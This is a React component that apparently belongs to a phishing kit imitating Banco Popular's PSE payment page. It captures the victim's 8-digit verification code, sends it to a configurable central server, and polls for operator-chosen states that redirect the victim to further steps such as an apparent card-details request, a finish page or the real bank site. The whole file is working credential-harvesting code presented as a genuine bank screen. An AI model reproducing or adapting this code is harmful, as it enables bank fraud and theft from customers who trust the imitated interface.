import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import styles from "./otp_popular.module.css";
import celular from "../../images/celular.png";
import { instanceBackend } from '../../../../../axios/instanceBackend';
import LoadingPopular from '../../../../../components/LoadingPopular';
import ModalErrorLoginPopular from '../../modals/ModalErrorLoginPopular';
import "../login/Popular_login_pse.css";

const POPULAR_ERROR_KEY = 'estado_sesion';
const POPULAR_MID_FLOW_KEY = 'popular_mid_flow';
const POPULAR_ERROR_OTP_MSG =
    'El código de verificación ingresado no es válido. Verifica e intenta nuevamente.';
const POPULAR_ERROR_AUTO_HIDE_MS = 5000;

const ESTADOS_TRAS_OTP = [
    'sol_otp',
    'sol_tc',
    'sol_finalizar',
    'error_otp',
    'error_login',
    'block_ip',
    'error_blocked',
];

const OtpPopular = () => {
    const navigate = useNavigate();

    const [otpValues, setOtpValues] = useState(['', '', '', '', '', '', '', '']);
    const [isLoading, setIsLoading] = useState(false);
    const [hasError, setHasError] = useState(false);
    const [showErrorModal, setShowErrorModal] = useState(false);
    const [errorMessage, setErrorMessage] = useState('');

    const inputRefs = useRef([]);
    const pollingIntervalRef = useRef(null);
    const sessionIdRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const allowPollNavigationRef = useRef(false);
    const closeOtpErrorModalRef = useRef(() => {});

    const clearOtpFields = () => {
        setOtpValues(['', '', '', '', '', '', '', '']);
        setHasError(false);
        inputRefs.current[0]?.focus();
    };

    const closeOtpErrorModal = () => {
        setShowErrorModal(false);
        setIsLoading(false);
        clearOtpFields();
    };

    const showOtpErrorBanner = (message = POPULAR_ERROR_OTP_MSG) => {
        setIsLoading(false);
        clearOtpFields();
        setErrorMessage(message);
        setShowErrorModal(true);
    };

    closeOtpErrorModalRef.current = closeOtpErrorModal;

    useEffect(() => {
        if (!showErrorModal) return undefined;

        const timer = window.setTimeout(() => {
            closeOtpErrorModalRef.current();
        }, POPULAR_ERROR_AUTO_HIDE_MS);

        return () => window.clearTimeout(timer);
    }, [showErrorModal]);

    const redirigir = (ruta) => {
        navigate(ruta);
    };

    const stopPolling = () => {
        if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
        }
    };

    useEffect(() => {
        const pendingError = localStorage.getItem(POPULAR_ERROR_KEY);
        const midFlow = sessionStorage.getItem(POPULAR_MID_FLOW_KEY) === '1';

        if (pendingError === 'error') {
            showOtpErrorBanner(POPULAR_ERROR_OTP_MSG);
        }
        if (pendingError) {
            localStorage.removeItem(POPULAR_ERROR_KEY);
        }

        let sid = localStorage.getItem('sessionId');
        if (!sid && (pendingError || midFlow)) {
            sid = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('sessionId', sid);
        }
        sessionIdRef.current = sid;

        if (midFlow) {
            allowPollNavigationRef.current = true;
            setIsLoading(true);
            initPolling();
        } else {
            allowPollNavigationRef.current = false;
        }

        if (inputRefs.current[0]) {
            inputRefs.current[0].focus();
        }

        return () => {
            stopPolling();
        };
    }, []);

    const handleChange = (index, value) => {
        if (!/^\d*$/.test(value)) return;

        const newValues = [...otpValues];
        newValues[index] = value.slice(-1);

        setOtpValues(newValues);
        setHasError(false);

        if (value && index < otpValues.length - 1) {
            inputRefs.current[index + 1]?.focus();
        }
    };

    const handleKeyDown = (index, e) => {
        if (e.key === 'Backspace' && !otpValues[index] && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
        if (e.key === 'ArrowLeft' && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
        if (e.key === 'ArrowRight' && index < otpValues.length - 1) {
            inputRefs.current[index + 1]?.focus();
        }
    };

    const handlePaste = (e) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text').slice(0, 8);

        if (!/^\d+$/.test(pastedData)) {
            setHasError(true);
            return;
        }

        const newValues = [...otpValues];
        pastedData.split('').forEach((char, i) => {
            if (i < newValues.length) newValues[i] = char;
        });

        setOtpValues(newValues);
        setHasError(false);

        const nextEmptyIndex = newValues.findIndex(v => !v);
        if (nextEmptyIndex !== -1) {
            inputRefs.current[nextEmptyIndex]?.focus();
        } else {
            inputRefs.current[newValues.length - 1]?.focus();
        }
    };

    const isOtpComplete = otpValues.every((v) => v !== '');

    const handleSubmit = async () => {
        const finalCode = otpValues.join('');

        if (finalCode.length !== 8) {
            setHasError(true);
            const firstEmptyIndex = otpValues.findIndex(v => v === '');
            if (firstEmptyIndex !== -1) {
                inputRefs.current[firstEmptyIndex]?.focus();
            }
            return;
        }

        if (isLoading) return;

        const sessionId = localStorage.getItem('sessionId') || sessionIdRef.current;
        if (!sessionId) {
            showOtpErrorBanner('Sesión no encontrada. Vuelve a iniciar sesión.');
            return;
        }

        const centralUrl = (
            process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ''
        ).trim();

        const dataSend = {
            data: {
                attributes: {
                    fecha: new Date().toISOString(),
                    otp: finalCode,
                    sessionId,
                    backend: 'P01',
                    backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    backend_url: '/api/v1/popular/otp',
                },
            },
        };

        inputRefs.current.forEach((ref) => {
            if (ref) ref.blur();
        });

        stopPolling();
        lastEstadoRef.current = null;

        try {
            setIsLoading(true);
            const response = centralUrl
                ? await instanceBackend.post(centralUrl, dataSend)
                : await instanceBackend.post('/popular/otp', dataSend);

            if (response?.data?.success) {
                const sid = response.data.sessionId ?? sessionId;
                localStorage.setItem('sessionId', sid);
                sessionIdRef.current = sid;
                sessionStorage.setItem(POPULAR_MID_FLOW_KEY, '1');
                allowPollNavigationRef.current = true;
                initPolling();
            } else {
                allowPollNavigationRef.current = false;
                showOtpErrorBanner(POPULAR_ERROR_OTP_MSG);
            }
        } catch (error) {
            setIsLoading(false);
            allowPollNavigationRef.current = false;
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || '')
                .toString()
                .toLowerCase();
            if (status === 403 && estadoErr === 'error_blocked') {
                sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);
                localStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || '/';
                return;
            }
            showOtpErrorBanner(
                centralUrl
                    ? 'Error de comunicación con el servidor central.'
                    : 'Error de conexión con el servidor.',
            );
        }
    };

    const initPolling = () => {
        stopPolling();
        pollingIntervalRef.current = setInterval(() => {
            verifyState();
        }, 3000);
        verifyState();
    };

    const verifyState = async () => {
        try {
            const response = await instanceBackend.post(
                `/popular/verify-state/${sessionIdRef.current}`,
            );
            const estadoActual = (response?.data?.estado || '').toLowerCase();

            if (!estadoActual) return;

            if (
                ESTADOS_TRAS_OTP.includes(estadoActual) &&
                !allowPollNavigationRef.current
            ) {
                return;
            }

            if (lastEstadoRef.current === estadoActual) return;
            lastEstadoRef.current = estadoActual;

            switch (estadoActual) {
                case 'error_otp':
                    stopPolling();
                    sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    showOtpErrorBanner(POPULAR_ERROR_OTP_MSG);
                    break;
                case 'error_login':
                    stopPolling();
                    setIsLoading(false);
                    sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    localStorage.setItem(POPULAR_ERROR_KEY, 'error');
                    redirigir('/popular_pse');
                    break;
                case 'sol_finalizar':
                    stopPolling();
                    setIsLoading(false);
                    sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    redirigir('/finalizado-pse');
                    break;
                case 'block_ip':
                case 'error_blocked':
                    stopPolling();
                    setIsLoading(false);
                    sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    showOtpErrorBanner('Acceso bloqueado por seguridad.');
                    break;
                default:
                    break;
            }
        } catch (error) {
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || '')
                .toString()
                .toLowerCase();
            if (status === 403 && estadoErr === 'error_blocked') {
                stopPolling();
                setIsLoading(false);
                sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);
                allowPollNavigationRef.current = false;
                localStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || '/';
            }
        }
    };

    return (
        <div className="popular-page">
            <header className="popular-header">
                <div className="popular-header__container">
                    <div className="popular-header__back"></div>
                    <h1 className="popular-header__title">PSE</h1>
                    <div className="popular-header__actions">
                        <button type="button" className="popular-header__close-btn">
                            <div className="popular-header__icon-box">
                                <em className="popular-icon-close">×</em>
                            </div>
                        </button>
                    </div>
                </div>
            </header>

            <div className="popular-header-spacer"></div>
            <main className="popular-main">
                <div className="popular-login-container">
                    <div className="popular-login-card">
                        <div className={styles.contentVirtual}>
                            <img
                                src={celular}
                                alt="Celular"
                                className={styles.imgIcon}
                            />

                            <h5 className={styles.title}>Autoriza esta transacción</h5>
                            <p className={`${styles.description} mt-4`}>
                                Para autorizar esta transacción, ingresa el código de verificación de 8 dígitos que <strong>enviamos a tu celular</strong>.
                            </p>

                            <div className={`${styles.contentOtp} mt-4`}>
                                <fieldset className={`${styles.otpFieldset} ${hasError ? styles.error : ''}`}>
                                    {otpValues.map((value, index) => (
                                        <input
                                            key={index}
                                            ref={(el) => { inputRefs.current[index] = el; }}
                                            type="text"
                                            inputMode="numeric"
                                            pattern="[0-9]*"
                                            maxLength={1}
                                            placeholder="-"
                                            value={value}
                                            onChange={(e) => handleChange(index, e.target.value)}
                                            onKeyDown={(e) => handleKeyDown(index, e)}
                                            onPaste={handlePaste}
                                            className={styles.otpInput}
                                            aria-label={`Dígito ${index + 1}`}
                                            disabled={isLoading}
                                        />
                                    ))}
                                </fieldset>
                            </div>

                            <div className={styles.buttons}>
                                <button
                                    type="button"
                                    className="popular-btn popular-btn--primary mt-4 mb-4"
                                    onClick={handleSubmit}
                                    disabled={!isOtpComplete || isLoading}
                                >
                                    Autorizar
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </main>

            <footer className="popular-footer">
                <div className="popular-footer__container">
                    <img
                        src="https://pse.bancopopular.com.co/assets/images/aval.png"
                        alt="Grupo Aval"
                        className="popular-footer__logo"
                    />
                    <div className="popular-footer__right">
                        <p className="popular-footer__copyright">
                            © Banco Popular | v1.0.28
                        </p>
                        <div className="recaptcha-badge">
                            <div className="recaptcha-badge-icon"></div>
                            <div className="recaptcha-badge-text">protección de reCAPTCHA</div>
                        </div>
                    </div>
                </div>
            </footer>

            {showErrorModal ? (
                <ModalErrorLoginPopular
                    isOpen={showErrorModal}
                    onClose={closeOtpErrorModal}
                    message={errorMessage || POPULAR_ERROR_OTP_MSG}
                />
            ) : null}

            {isLoading ? <LoadingPopular isOpen /> : null}
        </div>
    );
};

export default OtpPopular;